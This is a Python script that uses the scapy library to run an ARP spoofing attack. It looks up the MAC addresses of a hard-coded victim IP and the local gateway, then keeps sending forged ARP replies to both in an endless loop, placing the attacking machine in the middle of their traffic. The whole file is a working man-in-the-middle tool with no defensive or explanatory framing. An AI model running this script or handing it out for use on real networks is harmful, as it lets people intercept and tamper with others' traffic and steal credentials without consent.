import scapy.all as scapy
import time

def spoof(target_ip, target_mac, spoof_ip):
    ether = scapy.Ether(dst = target_mac)
    arp = scapy.ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = spoof_ip)
    packet = ether / arp
    scapy.sendp(packet, verbose=0)

def get_mac(ip):
    arp_request = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff") / scapy.ARP(pdst = ip)
    reply, x = scapy.srp(arp_request, timeout = 5, verbose = 0)
    if reply:
        return reply[0][1].src
    return None

def wait_till_mac_found(ip):
    mac = None
    while not mac:
        mac = get_mac(ip)
        if not mac:
            print("MAC adress for {} was not found".format(ip))
            exit(1)
    print("The target MAC adress is: {}".format(mac))
    return mac

default_gateway_ip = "192.168.68.1"
target_ip = "192.168.68.102"
target_mac = wait_till_mac_found(target_ip)
default_gateway_mac = wait_till_mac_found(default_gateway_ip)

if __name__ == "__main__":
    while True:
        spoof(target_ip, target_mac, default_gateway_ip)
        spoof(default_gateway_ip, default_gateway_mac, target_ip)
        print("Spoofing is active")
        time.sleep(2)